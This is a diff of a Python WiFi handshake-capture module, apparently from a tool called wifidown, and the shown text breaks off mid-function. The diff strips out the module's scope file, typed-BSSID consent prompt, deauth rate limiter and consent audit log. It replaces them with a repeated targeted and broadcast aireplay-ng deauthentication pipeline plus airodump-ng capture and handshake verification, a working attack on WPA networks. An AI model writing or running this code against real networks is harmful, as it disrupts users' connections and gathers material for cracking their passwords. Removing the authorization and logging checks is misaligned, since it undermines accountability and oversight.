@@ -2,23 +2,15 @@
 """
 Handshake capture module.
 
-Strategies:
-  1. Passive – wait for a natural 4-way handshake (scope warning only)
-  2. Deauth  – targeted per-client deauth + broadcast fallback (scope REQUIRED)
-  3. PMKID   – capture PMKID from AP (scope REQUIRED)
-
-Ethical safeguards
-──────────────────
-• Scope check   : deauth and PMKID require the BSSID to be listed in scope.yaml
-• Consent prompt: user must type the BSSID before any frame is sent
-• Rate limiter  : deauth bursts limited to DEFAULT_MAX_BURSTS_PER_MIN per client
-• Audit log     : every deauth burst logged with timestamp + user
+Three-phase pipeline:
+  Phase 1: Targeted deauth  — 10 attempts × 5 packets per client
+  Phase 2: Broadcast deauth — 5 attempts × 10 broadcast packets
+  Phase 3: PMKID passive    — 60-second hcxdumptool capture
 """
 from __future__ import annotations
 
 import csv
 import hashlib
-import logging
 import os
 import re
 import shutil
@@ -26,794 +18,546 @@ import subprocess
 import tempfile
 import threading
 import time
-from datetime import datetime
 from io import StringIO
-from pathlib import Path
-from typing import Optional
 
-from modules.banner import C, info, success, warn, error, print_section
-from modules.ratelimit import DeauthRateLimiter, DEFAULT_MAX_BURSTS_PER_MIN
-from modules.scope import ScopeManager
+from rich.console import Console
+from rich.live import Live
+from rich.text import Text
 
-logger = logging.getLogger(__name__)
-
-HANDSHAKE_TIMEOUT_DEFAULT = 120
-DEAUTH_COUNT              = 5       # per-direction, per-client — small burst, repeat fast
-DEAUTH_INTERVAL           = 5
-CAPTURE_DIR               = "captures"
-
-os.makedirs(CAPTURE_DIR, exist_ok=True)
-
-_rate_limiter: Optional[DeauthRateLimiter] = None
+console = Console()
 
 
-def get_rate_limiter(max_bursts: int = DEFAULT_MAX_BURSTS_PER_MIN) -> DeauthRateLimiter:
-    global _rate_limiter
-    if _rate_limiter is None:
-        _rate_limiter = DeauthRateLimiter(max_bursts_per_min=max_bursts)
-    return _rate_limiter
+# ─────────────────────────────────────────────────────────────────────────────
+# FUNCTION 1 — start_capture_process
+# ─────────────────────────────────────────────────────────────────────────────
 
-
-###############################################################################
-# Public entry point
-###############################################################################
-
-def capture_handshake_menu(
-    interface: str,
-    target: dict,
-    auto: bool = False,
-    scope: Optional[ScopeManager] = None,
-    deauth_limit: int = DEFAULT_MAX_BURSTS_PER_MIN,
-    fast: bool = False,
-) -> Optional[str]:
-    """
-    Interactive menu for handshake capture.
-    Returns path to .cap / .hash file, or None on failure.
-    """
-    print_section("Handshake Capture")
-    bssid   = target["bssid"]
-    channel = target["channel"]
-    ssid    = target.get("ssid", target.get("essid", bssid))
-
-    info(f"Target : {ssid}  [{bssid}]  CH{channel}")
-
-    if auto:
-        strategy = "2"
-    else:
-        print(f"""
-  {C.WHITE}Capture Strategy:{C.RESET}
-  {C.GREEN}[1]{C.RESET} Passive   – wait for natural handshake  {C.DIM}(no frames sent){C.RESET}
-  {C.GREEN}[2]{C.RESET} Deauth    – force reconnect  {C.YELLOW}(recommended — requires scope.yaml){C.RESET}
-  {C.GREEN}[3]{C.RESET} PMKID     – capture from AP beacon  {C.DIM}(requires scope.yaml){C.RESET}
-  {C.RED}[0]{C.RESET} Back
-""")
-        strategy = input(f"  {C.YELLOW}Strategy: {C.RESET}").strip()
-
-    if strategy == "0":
-        return None
-
-    timeout = HANDSHAKE_TIMEOUT_DEFAULT
-    if not auto:
-        try:
-            t = input(f"  {C.YELLOW}Timeout in seconds [{timeout}]: {C.RESET}").strip()
-            if t:
-                timeout = int(t)
-        except ValueError:
-            pass
-
-    ssid_safe = re.sub(r"[^\w]", "_", ssid)
-    stamp     = datetime.now().strftime("%Y%m%d_%H%M%S")
-    cap_base  = os.path.join(CAPTURE_DIR, f"{ssid_safe}_{stamp}")
-
-    if strategy == "1":
-        # Passive: scope warning only (no frames sent)
-        if scope and not scope.is_authorized(bssid):
-            warn(f"BSSID {bssid} is not in scope.yaml — passive capture allowed but noted.")
-            logger.warning("Passive capture on out-of-scope BSSID %s", bssid)
-        return _passive_capture(interface, bssid, channel, cap_base, timeout)
-
-    elif strategy == "2":
-        # Deauth: hard scope block (or fast-mode warning)
-        _enforce_scope_and_consent(scope, bssid, ssid, "Deauth + Handshake Capture", fast=fast)
-        limiter = get_rate_limiter(deauth_limit)
-        return _deauth_capture(interface, bssid, ssid, channel, cap_base, timeout, auto, limiter)
-
-    elif strategy == "3":
-        # PMKID: hard scope block (or fast-mode warning)
-        _enforce_scope_and_consent(scope, bssid, ssid, "PMKID Capture", fast=fast)
-        return _pmkid_capture(interface, bssid, cap_base, timeout)
-
-    else:
-        error("Invalid strategy.")
-        return None
-
-
-###############################################################################
-# Scope + consent helpers
-###############################################################################
-
-def _enforce_scope_and_consent(
-    scope: Optional[ScopeManager],
+def start_capture_process(
     bssid: str,
-    ssid: str,
-    operation: str,
-    fast: bool = False,
-) -> None:
-    """Raise ScopeError if out of scope; display consent prompt and require BSSID confirmation.
-
-    When fast=True the scope check and consent prompt are skipped and a red
-    warning banner is shown instead (lab / CTF mode).
+    channel: int,
+    monitor_interface: str,
+    cap_prefix: str,
+) -> subprocess.Popen:
     """
-    from rich.console import Console
-    from rich import box
-    from rich.panel import Panel
-    con = Console()
+    Start airodump-ng in background to capture all packets.
+    Returns the Popen handle — caller must terminate it.
+    cap_prefix: full path prefix e.g. captures/hs_MyNet_20260610
+    The actual file will be cap_prefix + "-01.cap"
+    """
+    cmd = [
+        "airodump-ng",
+        "--bssid",          bssid,
+        "--channel",        str(channel),
+        "--write",          cap_prefix,
+        "--output-format",  "pcap",
+        "--write-interval", "1",
+        monitor_interface,
+    ]
 
-    if fast:
-        con.print(Panel(
-            f"[bold red]⚡ FAST MODE — Scope & consent bypassed ⚡[/]\n\n"
-            f"Operation: [bold]{operation}[/]\n"
-            f"Target: [bold]{ssid}[/]  [{bssid}]\n\n"
-            "[bold yellow]AUTHORIZED LAB / CTF USE ONLY.[/]",
-            title="[bold red]Fast Mode Active[/]",
-            box=box.DOUBLE, border_style="red",
-        ))
-        logger.warning("Fast mode: scope bypassed bssid=%s operation=%s", bssid, operation)
-        return
-
-    # ── Scope check ───────────────────────────────────────────────────────
-    if scope is not None:
-        scope.require_authorized(bssid, operation)
-
-    # ── Consent prompt ────────────────────────────────────────────────────
-    con.print()
-    con.print(Panel(
-        f"[bold red]⚠  FRAME INJECTION WARNING  ⚠[/]\n\n"
-        f"You are about to perform: [bold]{operation}[/]\n\n"
-        f"  [bold]BSSID:[/] {bssid}\n"
-        f"  [bold]SSID: [/] {ssid}\n\n"
-        "This operation sends wireless frames to the target network.\n"
-        "[bold yellow]Only proceed if you have WRITTEN authorization from the owner.[/]\n\n"
-        "To confirm, type the target BSSID exactly below:",
-        title="[bold red]Authorization Required[/]",
-        box=box.DOUBLE,
-        border_style="red",
-    ))
-
-    # Require manual BSSID entry (no clipboard bypass)
-    import sys
-    sys.stdout.write(f"\n  Type BSSID to confirm: ")
-    sys.stdout.flush()
-    try:
-        # Read character-by-character to disable copy-paste feel (best-effort on terminal)
-        entered = input("").strip().upper()
-    except KeyboardInterrupt:
-        con.print("[red]Aborted.[/]")
-        raise SystemExit(0)
-
-    if entered != bssid.upper():
-        con.print(f"[red]BSSID mismatch (entered {entered!r}, expected {bssid!r}). Aborting.[/]")
-        raise SystemExit(1)
-
-    confirm = input("  Proceed? [y/N]: ").strip().lower()
-    if confirm != "y":
-        con.print("[red]Aborted by user.[/]")
-        raise SystemExit(0)
-
-    # Log consent
-    import os as _os
-    try:
-        username = _os.getlogin()
-    except OSError:
-        username = _os.environ.get("USER", "unknown")
-
-    logger.info(
-        "CONSENT_GRANTED user=%s bssid=%s operation=%s ts=%s",
-        username, bssid, operation,
-        datetime.now().isoformat(),
+    proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
     )
-    con.print(f"[green]✓ Consent logged for {bssid}[/]")
+
+    time.sleep(2)
+    console.print(f"[dim cyan]◈ Capture started → {cap_prefix}-01.cap[/]")
+    return proc
 
 
-###############################################################################
-# Strategy 1: Passive
-###############################################################################
+# ─────────────────────────────────────────────────────────────────────────────
+# FUNCTION 2 — verify_handshake
+# ─────────────────────────────────────────────────────────────────────────────
 
-def _passive_capture(interface, bssid, channel, cap_base, timeout) -> Optional[str]:
-    info("Passive capture — waiting for handshake...")
-    return _run_airodump_until_handshake(interface, bssid, channel, cap_base, timeout)
+def verify_handshake(cap_file: str, bssid: str) -> bool:
+    """
+    Check if cap_file contains a valid WPA handshake for bssid.
+    Uses aircrack-ng (no wordlist) — just detection.
+    Returns True if handshake found.
+    """
+    if not os.path.exists(cap_file):
+        return False
+    if os.path.getsize(cap_file) < 200:
+        return False
+
+    try:
+        result = subprocess.run(
+            ["aircrack-ng", "-b", bssid, cap_file],
+            capture_output=True,
+            text=True,
+            timeout=10,
+        )
+        output = result.stdout + result.stderr
+        if re.search(
+            r"(\d+\s+handshake|WPA\s+\(\d+\s+handshake)",
+            output,
+            re.IGNORECASE,
+        ):
+            return True
+        return False
+    except Exception:
+        return False
 
 
-###############################################################################
-# Strategy 2: Targeted deauth + capture
-###############################################################################
+# ─────────────────────────────────────────────────────────────────────────────
+# FUNCTION 3 — send_deauth_burst / kill_proc_safe
+# ─────────────────────────────────────────────────────────────────────────────
+
+def send_deauth_burst(
+    bssid: str,
+    monitor_interface: str,
+    client_mac: str | None = None,
+    count: int = 5,
+) -> subprocess.Popen:
+    """
+    Send a burst of deauth packets using Popen (non-blocking).
+    If client_mac is given → unicast targeted deauth.
+    If client_mac is None → broadcast deauth.
+    Returns the Popen handle.
+    Caller does NOT need to wait for it — fire and forget.
+    """
+    cmd = [
+        "aireplay-ng",
+        "-0", str(count),
+        "-a", bssid,
+    ]
+    if client_mac:
+        cmd += ["-c", client_mac]
+
+    cmd += ["--ignore-negative-one", monitor_interface]
+
+    try:
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        return proc
+    except FileNotFoundError:
+        raise RuntimeError("aireplay-ng not found. Install aircrack-ng suite.")
+    except Exception as e:
+        raise RuntimeError(f"aireplay-ng failed to start: {e}")
+
+
+def kill_proc_safe(proc: subprocess.Popen | None) -> None:
+    """Kill a Popen process safely without raising."""
+    if proc is None:
+        return
+    try:
+        proc.kill()
+        proc.wait(timeout=3)
+    except Exception:
+        pass
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# FUNCTION 4 — discover_clients
+# ─────────────────────────────────────────────────────────────────────────────
 
 def discover_clients(
     bssid: str,
+    channel: int,
     monitor_interface: str,
-    scan_duration: int = 10,
-    channel: Optional[int] = None,
-) -> list[dict]:
+    duration: int = 10,
+) -> list[str]:
     """
-    Passively sniff for clients associated with *bssid* via airodump-ng CSV.
-
-    Returns list of dicts sorted by signal strength (strongest first):
-      [{"mac": "AA:BB:CC:DD:EE:FF", "power": -45, "packets": 134, "probes": "net"}]
+    Passively scan for client MACs associated with bssid.
+    Returns list of client MAC strings sorted by signal strength
+    (strongest first). Empty list if none found.
     """
-    from rich.console import Console
-    from rich.live import Live
-    from rich.text import Text
-    con = Console()
-
-    tmpdir = tempfile.mkdtemp(prefix="wifidown_clients_")
-    output_prefix = os.path.join(tmpdir, "clients")
+    tmpdir = tempfile.mkdtemp(prefix="wifidown_cl_")
+    prefix = os.path.join(tmpdir, "scan")
 
     cmd = [
         "airodump-ng",
-        "--bssid", bssid,
+        "--bssid",         bssid,
+        "--channel",       str(channel),
+        "--write",         prefix,
         "--output-format", "csv",
-        "--write", output_prefix,
-        "--write-interval", "2",
+        "--write-interval","2",
+        monitor_interface,
     ]
-    if channel:
-        cmd += ["--channel", str(channel)]
-    cmd.append(monitor_interface)
-
-    con.print(
-        f"[dim cyan]◈ Scanning for connected clients on {bssid} ({scan_duration}s)...[/]"
-    )
 
     proc = subprocess.Popen(
         cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
 
-    try:
-        with Live(console=con, refresh_per_second=4) as live:
-            for remaining in range(scan_duration, 0, -1):
-                live.update(
-                    Text(
-                        f"  ◈ Sniffing clients... {remaining}s remaining",
-                        style="dim cyan",
-                    )
+    with Live(console=console, refresh_per_second=2) as live:
+        for i in range(duration, 0, -1):
+            live.update(
+                Text(
+                    f"  ◈ Scanning for clients... {i}s",
+                    style="dim cyan"
                 )
-                time.sleep(1)
-    finally:
-        proc.terminate()
-        try:
-            proc.wait(timeout=5)
-        except subprocess.TimeoutExpired:
-            proc.kill()
+            )
+            time.sleep(1)
 
-    clients: list[dict] = []
-    csv_file = output_prefix + "-01.csv"
+    proc.terminate()
+    try:
+        proc.wait(timeout=5)
+    except subprocess.TimeoutExpired:
+        proc.kill()
 
-    if not os.path.exists(csv_file):
-        shutil.rmtree(tmpdir, ignore_errors=True)
-        return clients
+    clients = []
+    csv_file = prefix + "-01.csv"
 
     try:
+        if not os.path.exists(csv_file):
+            return []
+
         with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
             content = f.read()
 
-        # airodump-ng CSV: Section 1 = APs, Section 2 = Stations
         sections = re.split(r"\n\s*\n", content)
-        client_section: Optional[str] = None
-        for section in sections:
-            if "Station MAC" in section:
-                client_section = section
+        client_section = None
+        for s in sections:
+            if "Station MAC" in s:
+                client_section = s
                 break
 
-        if client_section:
-            reader = csv.reader(StringIO(client_section))
-            header_found = False
-            for row in reader:
-                row = [cell.strip() for cell in row]
-                if not row:
-                    continue
-                if "Station MAC" in row[0]:
-                    header_found = True
-                    continue
-                if not header_found or len(row) < 6:
-                    continue
+        if not client_section:
+            return []
 
-                client_mac = row[0].strip().upper()
-                if not re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", client_mac):
-                    continue
+        rows = list(csv.reader(StringIO(client_section)))
+        header_idx = None
+        for i, row in enumerate(rows):
+            if row and "Station MAC" in row[0]:
+                header_idx = i
+                break
 
-                assoc_bssid = row[5].strip().upper() if len(row) > 5 else ""
-                if assoc_bssid in ("", "(NOT ASSOCIATED)"):
-                    continue
-                if assoc_bssid != bssid.strip().upper():
-                    continue
+        if header_idx is None:
+            return []
 
-                try:
-                    power = int(row[3].strip()) if row[3].strip() else -100
-                except ValueError:
-                    power = -100
-                try:
-                    packets = int(row[4].strip()) if row[4].strip() else 0
-                except ValueError:
-                    packets = 0
+        seen = {}
+        for row in rows[header_idx + 1:]:
+            row = [c.strip() for c in row]
+            if len(row) < 6:
+                continue
+            mac = row[0].upper()
+            if not re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", mac):
+                continue
+            assoc = row[5].strip().upper() if len(row) > 5 else ""
+            if assoc and assoc != "(NOT ASSOCIATED)":
+                if assoc == bssid.upper() or not assoc:
+                    try:
+                        power = int(row[3]) if row[3].strip() else -100
+                    except ValueError:
+                        power = -100
+                    seen[mac] = power
 
-                clients.append({
-                    "mac":     client_mac,
-                    "power":   power,
-                    "packets": packets,
-                    "probes":  row[6].strip() if len(row) > 6 else "",
-                })
+        clients = sorted(seen.keys(), key=lambda m: seen[m], reverse=True)
 
-    except Exception as exc:
-        logger.debug("Client CSV parse error: %s", exc)
+    except Exception as e:
+        console.print(f"[dim yellow]  Client parse error: {e}[/]")
     finally:
         shutil.rmtree(tmpdir, ignore_errors=True)
 
-    clients.sort(key=lambda c: c["power"], reverse=True)
     return clients
 
 
-def display_clients(clients: list[dict], bssid: str) -> None:
-    """Print a Rich table of discovered clients."""
-    from rich.console import Console
-    from rich.table import Table
-    from rich.text import Text
-    con = Console()
+# ─────────────────────────────────────────────────────────────────────────────
+# FUNCTION 5 — capture_handshake (master pipeline)
+# ─────────────────────────────────────────────────────────────────────────────
 
-    if not clients:
-        con.print(f"[yellow]  No clients currently associated with {bssid}[/]")
-        return
-
-    table = Table(
-        title=f"Connected clients on {bssid}",
-        border_style="color(23)",
-        header_style="color(51) bold",
-        show_lines=False,
-    )
-    table.add_column("No.", style="dim", width=4)
-    table.add_column("Client MAC", style="color(87) bold")
-    table.add_column("Signal", style="color(50)")
-    table.add_column("Packets", style="dim cyan")
-    table.add_column("Probes", style="dim")
-
-    for i, client in enumerate(clients, 1):
-        signal_str = f"{client['power']} dBm"
-        signal_style = (
-            "green" if client["power"] > -50
-            else "yellow" if client["power"] > -70
-            else "red"
-        )
-        table.add_row(
-            str(i),
-            client["mac"],
-            Text(signal_str, style=signal_style),
-            str(client["packets"]),
-            client["probes"] or "—",
-        )
-
-    con.print(table)
-
-
-
-def send_targeted_deauth(
-    bssid: str,
-    client_mac: str,
-    monitor_interface: str,
-    limiter: DeauthRateLimiter,
-    count: int = DEAUTH_COUNT,
-) -> bool:
-    """
-    Send targeted unicast deauth in both directions (non-blocking via Popen).
-
-    AP→Client: spoofed as AP, forces client to disassociate.
-    Client→AP: spoofed as client, forces AP to drop the session.
-
-    Both procs run concurrently; we wait up to 60 s for each to finish
-    and kill cleanly on timeout — timeout is not fatal because the
-    packets have already been injected by that point.
-    """
-    from rich.console import Console
-    con = Console()
-
-    # Rate-limit per-client key so we don't hammer the same device back-to-back
-    limiter.wait_for_burst(bssid, client_mac)
-
-    procs: list[subprocess.Popen] = []
-
-    # Direction 1: AP → Client
-    con.print(
-        f"[dim cyan]  ↳ Deauth AP→Client  "
-        f"[bold]{bssid}[/bold] → [bold]{client_mac}[/bold] ({count} pkts)[/]"
-    )
-    try:
-        procs.append(subprocess.Popen(
-            ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client_mac,
-             "--ignore-negative-one", monitor_interface],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        ))
-    except FileNotFoundError:
-        con.print("[red]  aireplay-ng not found.[/]")
-        return False
-    except Exception as exc:
-        con.print(f"[red]  Deauth AP→Client error: {exc}[/]")
-        return False
-
-    time.sleep(0.1)
-
-    # Direction 2: Client → AP (reversed -a/-c: spoofed as client, AP drops session)
-    con.print(
-        f"[dim cyan]  ↳ Deauth Client→AP  "
-        f"[bold]{client_mac}[/bold] → [bold]{bssid}[/bold] ({count} pkts)[/]"
-    )
-    try:
-        procs.append(subprocess.Popen(
-            ["aireplay-ng", "-0", str(count), "-a", client_mac, "-c", bssid,
-             "--ignore-negative-one", monitor_interface],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        ))
-    except Exception as exc:
-        con.print(f"[dim yellow]  Deauth Client→AP error: {exc}[/]")
-
-    # Wait for both directions; kill if they stall — packets already in-flight
-    for proc in procs:
-        try:
-            proc.wait(timeout=60)
-        except subprocess.TimeoutExpired:
-            con.print("[dim yellow]  Deauth proc stalled — killing cleanly[/]")
-            proc.kill()
-            try:
-                proc.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                pass
-            # Not re-raised: timeout here means packets were sent, ACK just slow
-
-    logger.info(
-        "Targeted deauth sent: bssid=%s client=%s count=%d",
-        bssid, client_mac, count,
-    )
-    return True
-
-
-def send_broadcast_deauth_fallback(
-    bssid: str,
-    monitor_interface: str,
-    limiter: DeauthRateLimiter,
-    count: int = 10,
-) -> None:
-    """Broadcast deauth — fallback only when no clients are discovered."""
-    from rich.console import Console
-    con = Console()
-
-    limiter.wait_for_burst(bssid)
-    con.print(
-        f"[dim yellow]  ↳ Broadcast deauth fallback on {bssid} ({count} pkts)...[/]"
-    )
-    try:
-        proc = subprocess.Popen(
-            ["aireplay-ng", "-0", str(count), "-a", bssid,
-             "--ignore-negative-one", monitor_interface],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-        try:
-            proc.wait(timeout=60)
-        except subprocess.TimeoutExpired:
-            proc.kill()
-            try:
-                proc.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                pass
-    except FileNotFoundError:
-        con.print("[red]  aireplay-ng not found.[/]")
-    except Exception as exc:
-        con.print(f"[dim yellow]  Broadcast deauth error: {exc}[/]")
-    logger.info("Broadcast deauth fallback: bssid=%s count=%d", bssid, count)
-
-
-def _deauth_capture(
-    interface: str,
+def capture_handshake(
     bssid: str,
     ssid: str,
     channel: int,
-    cap_base: str,
-    timeout: int,
-    auto: bool,
-    limiter: DeauthRateLimiter,
-) -> Optional[str]:
+    monitor_interface: str,
+    output_dir: str = "captures",
+) -> str | None:
     """
-    Handshake capture via targeted per-client deauth with broadcast fallback.
+    Master handshake capture pipeline.
 
-    Pipeline per attempt:
-      1. Discover connected clients (passive airodump-ng scan)
-      2a. If clients found: send bidirectional targeted deauth to each (up to 3)
-          and check for handshake after each burst
-      2b. If no clients: broadcast deauth fallback
-      3. Wait up to timeout_per_attempt seconds checking for handshake
-      4. Repeat up to max_attempts times
-      PMKID capture runs in parallel throughout as a background thread.
+    Phase 1: Targeted deauth → 10 attempts × 5 packets per client
+    Phase 2: Broadcast deauth fallback → 5 attempts × 10 packets
+    Phase 3: PMKID passive capture → 60 seconds
+
+    Returns path to cap/hc22000 file on success, None on total failure.
     """
-    from rich.console import Console
-    con = Console()
+    from modules.scope import check_scope
+    check_scope(bssid)
 
-    cap_file = cap_base + "-01.cap"
+    os.makedirs(output_dir, exist_ok=True)
+    timestamp   = time.strftime("%Y%m%d_%H%M%S")
+    safe_ssid   = re.sub(r"[^a-zA-Z0-9_\-]", "_", ssid)[:20]
+    cap_prefix  = os.path.join(output_dir, f"hs_{safe_ssid}_{timestamp}")
+    cap_file    = cap_prefix + "-01.cap"
 
-    # Derive attempt budget from total timeout
-    # Each attempt ~= scan(6-8s) + deauths(~5s) + wait(10s) + pause(3s) ~= 28s
-    max_attempts = max(3, timeout // 28)
-    timeout_per_attempt = max(8, timeout // max_attempts - 15)
+    console.print(f"\n[bold cyan]◈ Handshake Capture[/]")
+    console.print(f"  Target    : [bold]{ssid}[/bold]  ({bssid})")
+    console.print(f"  Channel   : {channel}")
+    console.print(f"  Interface : {monitor_interface}\n")
 
-    con.print(f"\n[cyan]◈ Starting targeted handshake capture[/]")
-    con.print(f"  Target:    [bold]{ssid}[/bold] ({bssid})")
-    con.print(f"  Channel:   {channel}")
-    con.print(f"  Interface: {interface}")
-    con.print(f"  Strategy:  targeted deauth + PMKID parallel")
-    con.print(f"  Attempts:  {max_attempts}  (timeout {timeout}s)\n")
+    # ──────────────────────────────────────────────────────────
+    # PHASE 1 — TARGETED DEAUTH
+    # ──────────────────────────────────────────────────────────
 
-    # Start passive packet capture in background (runs throughout all attempts)
-    dump_proc = _start_airodump(interface, bssid, channel, cap_base)
-    time.sleep(2)  # let airodump-ng initialize before injecting
+    console.print("[bold cyan]── Phase 1: Targeted deauth ──[/]\n")
 
-    # PMKID capture in parallel -- no deauth needed, grabs from association frame
-    pmkid_result: dict[str, Optional[str]] = {"path": None}
+    capture_proc = start_capture_process(
+        bssid, channel, monitor_interface, cap_prefix
+    )
 
-    def _pmkid_worker() -> None:
-        pmkid_result["path"] = _pmkid_capture(
-            interface, bssid, cap_base, min(timeout - 5, 60)
+    found_event = threading.Event()
+
+    def handshake_watcher():
+        """Background thread: checks cap file every 1 second."""
+        while not found_event.is_set():
+            if verify_handshake(cap_file, bssid):
+                found_event.set()
+            time.sleep(1)
+
+    watcher = threading.Thread(target=handshake_watcher, daemon=True)
+    watcher.start()
+
+    console.print("[dim cyan]◈ Discovering connected clients...[/]")
+    clients = discover_clients(bssid, channel, monitor_interface, duration=10)
+
+    if clients:
+        console.print(
+            f"[green]  ✓ Found {len(clients)} client(s): "
+            f"{', '.join(clients[:3])}[/]"
         )
+    else:
+        console.print("[dim yellow]  No clients found.[/]")
 
-    pmkid_thread = threading.Thread(target=_pmkid_worker, daemon=True)
-    pmkid_thread.start()
+    handshake_path = None
 
-    handshake_found = False
+    if clients:
+        MAX_ATTEMPTS  = 10
+        PACKETS       = 5
+        WAIT_SECONDS  = 3
 
-    try:
-        for attempt in range(1, max_attempts + 1):
-            con.print(f"\n[cyan]◈ Attempt {attempt}/{max_attempts}[/]")
+        deauth_procs = []
 
-            # Shorter scan on repeat attempts (clients don't change much)
-            scan_secs = 8 if attempt == 1 else 5
-            clients = discover_clients(
-                bssid=bssid,
-                monitor_interface=interface,
-                scan_duration=scan_secs,
-                channel=channel,
-            )
+        for attempt in range(1, MAX_ATTEMPTS + 1):
 
-            if clients:
-                display_clients(clients, bssid)
-                con.print(
-                    f"[green]  ✓ {len(clients)} client(s) found -- sending targeted deauth[/]"
-                )
-
-                for client in clients[:3]:
-                    con.print(
-                        f"\n[cyan]  ◈ Targeting [bold]{client['mac']}[/bold] "
-                        f"(signal: {client['power']} dBm)[/]"
-                    )
-                    send_targeted_deauth(
-                        bssid=bssid,
-                        client_mac=client["mac"],
-                        monitor_interface=interface,
-                        limiter=limiter,
-                        count=DEAUTH_COUNT,
-                    )
-                    # Poll every second for 8 s — handshake often arrives within 2-3 s
-                    for _ in range(8):
-                        time.sleep(1)
-                        if _verify_handshake(cap_file, bssid):
-                            handshake_found = True
-                            break
-                    if handshake_found:
-                         break
-
-                if not handshake_found:
-                    # All clients deauthed — give reassociation a final window
-                    con.print("[dim cyan]  Waiting for reassociation...[/]")
-                    for _ in range(timeout_per_attempt):
-                        time.sleep(1)
-                        if _verify_handshake(cap_file, bssid):
-                            handshake_found = True
-                            break
-
-            else:
-                con.print(
-                    "[dim yellow]  No clients found -- broadcast deauth fallback[/]"
-                )
-                send_broadcast_deauth_fallback(
-                    bssid=bssid,
-                    monitor_interface=interface,
-                    limiter=limiter,
-                    count=16,
-                )
-                for _ in range(timeout_per_attempt + 5):
-                    time.sleep(1)
-                    if _verify_handshake(cap_file, bssid):
-                        handshake_found = True
-                        break
-
-            if handshake_found:
+            if found_event.is_set():
                 break
 
-            if attempt < max_attempts:
-                con.print(f"[dim]  Not yet captured -- retrying in 3s...[/]")
-                time.sleep(3)
+            console.print(
+                f"\n[cyan]  Attempt {attempt}/{MAX_ATTEMPTS} "
+                f"— sending {PACKETS} deauth packets[/]"
+            )
 
-    except KeyboardInterrupt:
-        warn("Capture interrupted by user.")
-    finally:
-        dump_proc.terminate()
-        try:
-            dump_proc.wait(timeout=5)
-        except subprocess.TimeoutExpired:
-            dump_proc.kill()
+            for p in deauth_procs:
+                kill_proc_safe(p)
+            deauth_procs.clear()
 
-    # Report PMKID result (background thread may still be running -- join briefly)
-    pmkid_thread.join(timeout=3)
-    if pmkid_result["path"]:
-        con.print(f"[green]◈ PMKID also captured: {pmkid_result['path']}[/]")
+            p1 = send_deauth_burst(
+                bssid, monitor_interface,
+                client_mac=clients[0],
+                count=PACKETS,
+            )
+            deauth_procs.append(p1)
+            console.print(
+                f"[dim cyan]    → {clients[0]} (primary)[/]"
+            )
 
-    if handshake_found:
-        # Compute SHA-256 as audit evidence
-        try:
-            with open(cap_file, "rb") as f:
-                sha256 = hashlib.sha256(f.read()).hexdigest()
-            con.print(f"  SHA-256: [dim]{sha256}[/dim]")
-        except OSError:
-            pass
+            if len(clients) > 1:
+                p2 = send_deauth_burst(
+                    bssid, monitor_interface,
+                    client_mac=clients[1],
+                    count=PACKETS,
+                )
+                deauth_procs.append(p2)
+                console.print(
+                    f"[dim cyan]    → {clients[1]} (secondary)[/]"
+                )
 
-    return _finalize(cap_file, handshake_found)
+            for sec in range(WAIT_SECONDS, 0, -1):
+                if found_event.is_set():
+                    break
+                console.print(
+                    f"[dim]    Watching for handshake... {sec}s[/]",
+                    end="\r"
+                )
+                time.sleep(1)
 
+            if found_event.is_set() or verify_handshake(cap_file, bssid):
+                found_event.set()
+                break
 
-###############################################################################
-# Strategy 3: PMKID
-###############################################################################
+        for p in deauth_procs:
+            kill_proc_safe(p)
 
-def _pmkid_capture(interface: str, bssid: str, cap_base: str, timeout: int) -> Optional[str]:
-    if not shutil.which("hcxdumptool"):
-        logger.debug("hcxdumptool not found -- PMKID capture skipped")
-        return None
-
-    pcapng_file = cap_base + "_pmkid.pcapng"
-    hash_file   = cap_base + "_pmkid.hc22000"
-
-    filter_fd, filter_path = tempfile.mkstemp(suffix=".txt", prefix="wifidown_pmkid_")
-    try:
-        with os.fdopen(filter_fd, "w") as f:
-            f.write(bssid.replace(":", "").lower() + "\n")
-
-        proc = subprocess.Popen(
-            [
-                "hcxdumptool",
-                "-i", interface,
-                "-o", pcapng_file,
-                f"--filterlist_ap={filter_path}",
-                "--filtermode=2",
-                "--disable_deauthentication",
-            ],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
+    if found_event.is_set() or verify_handshake(cap_file, bssid):
+        handshake_path = cap_file
+        console.print(
+            f"\n[bold green]◈ Handshake captured! (Phase 1)[/]"
         )
+    else:
+        console.print(
+            "\n[yellow]◈ Failed to capture handshake after "
+            "10 attempts.[/]"
+        )
+
+        # ──────────────────────────────────────────────────────
+        # PHASE 2 — BROADCAST DEAUTH FALLBACK
+        # ──────────────────────────────────────────────────────
+
+        console.print("\n[bold cyan]── Phase 2: Broadcast deauth ──[/]\n")
+
+        MAX_BCAST     = 5
+        BCAST_PACKETS = 10
+        BCAST_WAIT    = 4
+
+        for attempt in range(1, MAX_BCAST + 1):
+
+            if found_event.is_set():
+                break
+
+            console.print(
+                f"[cyan]  Broadcast attempt {attempt}/{MAX_BCAST} "
+                f"— {BCAST_PACKETS} packets[/]"
+            )
+
+            p = send_deauth_burst(
+                bssid, monitor_interface,
+                client_mac=None,
+                count=BCAST_PACKETS,
+            )
+
+            for sec in range(BCAST_WAIT, 0, -1):
+                if found_event.is_set():
+                    break
+                console.print(
+                    f"[dim]    Watching... {sec}s[/]",
+                    end="\r"
+                )
+                time.sleep(1)
+
+            kill_proc_safe(p)
+
+            if found_event.is_set() or verify_handshake(cap_file, bssid):
+                found_event.set()
+                break
+
+        if found_event.is_set() or verify_handshake(cap_file, bssid):
+            handshake_path = cap_file
+            console.print(
+                "\n[bold green]◈ Handshake captured! (Phase 2)[/]"
